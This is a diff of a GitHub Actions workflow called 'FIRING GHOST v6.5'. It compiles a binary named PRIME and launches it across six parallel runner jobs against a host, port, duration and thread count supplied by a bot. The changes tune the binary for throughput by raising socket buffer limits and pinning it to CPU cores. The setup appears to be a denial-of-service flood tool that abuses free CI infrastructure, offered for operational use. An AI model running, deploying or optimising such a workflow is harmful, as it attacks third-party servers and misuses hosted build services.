@@ -21,7 +21,6 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
-      # ⚠️ Max 6 Concurrent Jobs per account for Free Tier efficiency
       max-parallel: 6 
       matrix:
         node: [1, 2, 3, 4, 5, 6] 
@@ -31,10 +30,14 @@ jobs:
 
       - name: 🔥 FIRING GHOST v6.5
         run: |
-          # Compilation with -O3 (Maximum Speed Optimization)
-          gcc -O3 prime.c -o PRIME -lpthread
+          # 1. Compilation with -O3 and -march=native (Hardware Specific Speed)
+          gcc -O3 -march=native prime.c -o PRIME -lpthread
           chmod +x PRIME
           
-          # Execute with bot inputs (IP PORT TIME THREADS)
-          ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+          # 2. Limit Core Locking & Priority Execution
+          # taskset -c 0,1 ensures both CPU cores focus 100% on the binary
+          sudo sysctl -w net.core.rmem_max=26214400
+          sudo sysctl -w net.core.wmem_max=26214400
+          
+          taskset -c 0,1 ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
           
